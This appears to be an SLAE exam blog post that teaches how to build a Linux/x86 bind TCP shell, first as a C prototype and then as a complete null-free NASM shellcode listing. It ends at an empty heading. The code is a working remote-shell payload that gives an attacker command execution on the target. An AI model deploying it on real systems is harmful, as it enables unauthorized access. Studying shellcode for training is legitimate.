# SLAE Exam Assignment 1 - Creating a Bind TCP shellcode

## Prologue
The first assignment for the SLAE certification exam is creating a Bind TCP shellcode for Linux/x86 architecture using the shellcoding knowledge that we have accumulated from the SLAE course and from our self-learning process.

So without any further ado, let's get down with it shall we?

## So what is Bind TCP anyway?
Let's take a look at a visual representation first and then we shall get down to the details.

![Bind TCP Overview](../assets/images/bind_tcp_overview.png "Bind TCP Overview")

As is illustrated by the image, the victim/target machine opens a port and listens or waits for an incoming connection request by the attacker who then connects to it. After a connection is established successfully between them, the target can now execute any abritary command as instructed by the attacker machine.

In other words, the victim is running the TCP server and the attacker is running the TCP client code.

An important point to remember is that this whole situation **reverses in a Reverse TCP shell.**

So how is this useful in the context of Information Security?

Honestly, bind shells are not that useful in a pen-testing scenario because for one firewalls have very strict inbound traffic filtering rules so inbound traffic from an unknown attacker's IP will probably be blocked and the shell won't be functioning. A Reverse TCP shell is what we use almost always in a pen-testing engagement as a workaround for this problem. You can find more information about this in the next blog post.

## A C Prototype first
If we are going to program in something as low-level as machine code it is only fair that we first create a prototype in a high-level language like C/C++ to conceptualize it and get a template for creating our assembly code right?

```c
// Filename: bind_tcp.cpp
// Author: Upayan a.k.a. slaeryan
// Purpose: This is a x86 Linux bind TCP shell written in C/C++ that inputs
// the C2 port from the console by the operator.
// Usage: ./bind_tcp 8080
// Compile with:
// g++ bind_tcp.cpp -o bind_tcp
// Testing: nc -v localhost 8080

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

//#define C2_PORT 8080

int main(int argc, char const *argv[]) 
{
    // Console C2 Port input from operator
    char* c2portstring = (char*)argv[1];
    int C2_PORT = atoi(c2portstring);
    // Declaring a sockaddr_in struct and an int var for socket file descriptor
    struct sockaddr_in server;
    int sockfd;
    // Initializing the sockaddr_in struct
    server.sin_family = AF_INET;           
    server.sin_addr.s_addr = INADDR_ANY;  
    server.sin_port = htons(C2_PORT);
    // 1st Syscall for creating the socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);        
    // 2nd Syscall for binding the socket
    bind(sockfd, (struct sockaddr *)&server, sizeof(server));
    // 3rd Syscall to listen for connections
    listen(sockfd, 0);
    // 4th Syscall to accept incoming connections
    int conn_sock = accept(sockfd, NULL, NULL);
    // 5rd Syscall for dup2()
    dup2(conn_sock, 0); // STDIN
    dup2(conn_sock, 1); // STDOUT
    dup2(conn_sock, 2); // STDERR
    // 6th Syscall for execve()
    execve("/bin/sh", 0, 0);
    return 0;
}
```

And here is a fully-functional C source for a bind shell payload. Stripping the C code down to it's essential details, we note the following syscalls to be made in our assembly code:

1. socket
1. bind
1. listen
1. accept
1. dup2
1. execve

Wonderful! Now let's get started with recreating the payload in ASM.

## Creating the Assembly program
### Clearing registers
The first set of instructions are almost always the same which is clearing the register sets we will be using in our program.

```nasm
; Clearing the first 4 registers for 1st Syscall - socket()
xor eax, eax       ; May also sub OR mul for zeroing out
xor ebx, ebx       ; Clearing out EBX 
xor ecx, ecx       ; Clearing out ECX
cdq                ; Clearing out EDX 
```

Note that we didn't use XOR'ing for clearing the EDX register instead we used `cdq` which actually copies the sign bit of EAX register into each bit position in EDX register essentially clearing it out. This saved us 1 byte in the process ;)
### Socket syscall
Now we will initiate the socket syscall using the good ol' software interrupt 80h.

```nasm
; Syscall value for socket() = 359 OR 0x167, loading it in AX
mov ax, 0x167
; Loading 2 in BL for AF_INET - 1st argument for socket()
mov bl, 0x02
; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
mov cl, 0x01
; 3rd argument for socket() - 0 is already in EDX register
; Execute the socket() Syscall
int 0x80
; Storing the return value - socket fd in EAX to EBX for later usage
mov ebx, eax
```

Now moving to setup the sockaddr_in struct.
### Setting up the sockaddr_in struct for bind syscall
Note from the C prototype that the sockaddr_in struct consists of:

1. The server IP address - we will leave it empty for localhost/we will not push it into the stack since it's not strictly necessary and we'll be able to save a byte
1. The addressing schema(In this case it's IPv4 so it's value shall be 2 or 0x02)
1. The listening port
1. 0 to enable listening on all interfaces

So let us start by pushing those into the stack. Note that I have configured the C2 a.k.a Command & Control/Listening port to be configurable while assembling via nasm with the `-D` flag.

```nasm
; Loading 0 to listen on all interfaces - sockaddr_in struct - 3rd argument
push edx
; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
push word C2_PORT      ; 0x901f - C2 Port: 8080
; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
push word 0x02
```

Now that we have finished setting up the sockaddr_in struct, let's move on to the bind() syscall.
### Bind syscall
These bind() arguments can be summarized as follows:

1. int sockfd – this is a reference to the socket fd that was created in the first syscall, this is why we moved EAX into EBX
1. struct sockaddr_in server – this is a pointer to the location on the stack of the sockaddr struct that we just created
1. socklen_t serverlen – this is the length of the address the value of which the /usr/include/linux/in.h file tells us is 16

So based on these facts, let's initiate the bind syscall.

```nasm
; bind() Syscall
mov ax, 0x169          ; Syscall for bind() = 361 OR 0x169, loading it in AX
mov ecx, esp           ; Moving sockaddr_in struct from TOS to ECX
mov dl, 16             ; socklen_t addrlen = 16
int 0x80               ; Execute the bind syscall
```

### Listen syscall
The listen() arguments can be summarized as follows:

1. int sockfd - this is a reference to the socket fd that was created in the first syscall, still set in EBX
1. 0 - since we will immediately accept the first incoming connection

Based on these facts, let's initiate the listen syscall.

```nasm
; listen() Syscall
mov ax, 0x16b          ; Syscall for listen() = 363 or 0x16b, loading it in AX
xor ecx, ecx           ; Clearing ECX for listen syscall
int 0x80               ; Execute listen syscall
```

### Accept syscall
The accept4() arguments can be summarized as follows:

1. int sockfd - this is a reference to the socket fd that was created in the first syscall, still set in EBX
1. NULL - we will use ECX for this which is already set to 0
1. NULL - we will clear EDX for this
1. 0 - we will clear ESI for this

Let's initiate the accept4 syscall based on these facts.

```nasm
; accept() Syscall 
mov ax, 0x16c          ; Syscall for accept4() = 364 or 0x16c, loading it in AX
; 1st argument for accept() - sockfd - still in EBX
; 2nd argument for accept() - 0 - still in ECX
cdq                    ; Clearing EDX for 3rd argument - 0
xor esi, esi           ; Clearing ESI for 4th argument - 0
int 0x80               ; Execute accept4 syscall
```

### Setting up the registers for the third syscall - dup2
Now we will move the contents of the connection socket returned from accept syscall from EAX to EBX which will save it for for the next syscall i.e. dup2 and also set up a loop variable to 3.
Why? We will come to that in a second.

```nasm
; Storing the return value connection socket fd in EAX to EBX for later usage
mov ebx, eax
; Initializing a counter variable = 3 for loop
mov cl, 0x3
```

### Dup2 syscall
Remember from our C prototype that we see the dup2() call is iterating 3 times? Now the counter makes sense right?

This is in order to duplicate into our accepted connection socket the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive for us the attacker.

So we are going to be using a simple `jnz short` loop to iterate over the dup2 syscall three times.

```nasm
; dup2() Syscall in loop
loop_dup2:
mov al, 0x3f          ; dup2() Syscall number = 63 OR 0x3f
dec ecx               ; Decrement ECX by 1
int 0x80              ; Execute the dup2 syscall
jnz short loop_dup2   ; Jump back to loop_dup2 label until ZF is set
```

### Execve syscall
At last now that we have created a socket, established a connection and duplicated the file descriptors, now what?

Now we execute `/bin/sh` using Execve-Stack method that we learnt previously to execute commands on the target machine remotely.

```nasm
; execve() Syscall
cdq                    ; Clearing out EDX
push edx               ; push for NULL termination
push dword 0x68732f2f  ; push //sh
push dword 0x6e69622f  ; push /bin
mov ebx, esp           ; store address of TOS - /bin//sh
mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
int 0x80               ; Execute the system call
```

Note that I bastardized the original method to save us some bytes.

## Full Assembly code
Here is the full assembly code all pieced up together and prettied up.

```nasm
; Filename: bind_tcp_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux bind TCP null-free shellcode.
; Usage: ./bind_tcp_shellcode
; Note: The C2 Port is configurable while assembling with the -D flag.
; Compile with:
; ./compile.sh bind_tcp_shellcode
; Testing: nc -v localhost 8080
; Size of shellcode: 82 bytes


global _start

section .text
_start:

	; Clearing the first 4 registers for 1st Syscall - socket()
	xor eax, eax          ; May also sub OR mul for zeroing out
	xor ebx, ebx          ; Clearing out EBX 
	xor ecx, ecx          ; Clearing out ECX
	cdq                   ; Clearing out EDX

	; Syscall for socket() = 359 OR 0x167, loading it in AX
	mov ax, 0x167

	; Loading 2 in BL for AF_INET - 1st argument for socket()
	mov bl, 0x02

	; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
	mov cl, 0x01

	; 3rd argument for socket() - 0 is already in EDX register

	; socket() Syscall
	int 0x80

	; Storing the return value socket fd in EAX to EBX for later usage
	mov ebx, eax

	; Loading 0 to listen on all interfaces - sockaddr_in struct - 3rd argument
	push edx

	; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
	push word C2_PORT      ; 0x901f - C2 Port: 8080

	; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
	push word 0x02

	; bind() Syscall
	mov ax, 0x169          ; Syscall for bind() = 361 OR 0x169, loading it in AX
	mov ecx, esp           ; Moving sockaddr_in struct from TOS to ECX
	mov dl, 16             ; socklen_t addrlen = 16
	int 0x80               ; Execute the bind syscall

	; listen() Syscall
	mov ax, 0x16b          ; Syscall for listen() = 363 or 0x16b, loading it in AX
	xor ecx, ecx           ; Clearing ECX for listen syscall
	int 0x80               ; Execute listen syscall

	; accept() Syscall 
	mov ax, 0x16c          ; Syscall for accept4() = 364 or 0x16c, loading it in AX
	; 1st argument for accept() - sockfd - still in EBX
	; 2nd argument for accept() - 0 - still in ECX
	cdq                    ; Clearing EDX for 3rd argument - 0
	xor esi, esi           ; Clearing ESI for 4th argument - 0
	int 0x80               ; Execute accept4 syscall
    
	; Storing the return value connection socket fd in EAX to EBX for later usage
	mov ebx, eax
	; Initializing a counter variable = 3 for loop
	mov cl, 0x3    

	; dup2() Syscall in loop
	loop_dup2:
	mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
	dec ecx                ; Decrement ECX by 1
	int 0x80               ; Execute the dup2 syscall
	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set

	; execve() Syscall
	push edx               ; push for NULL termination - EDX already set to 0
	push dword 0x68732f2f  ; push //sh
	push dword 0x6e69622f  ; push /bin
	mov ebx, esp           ; store address of TOS - /bin//sh
	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
	int 0x80               ; Execute the system call
```

## A Bind TCP shellcode generator





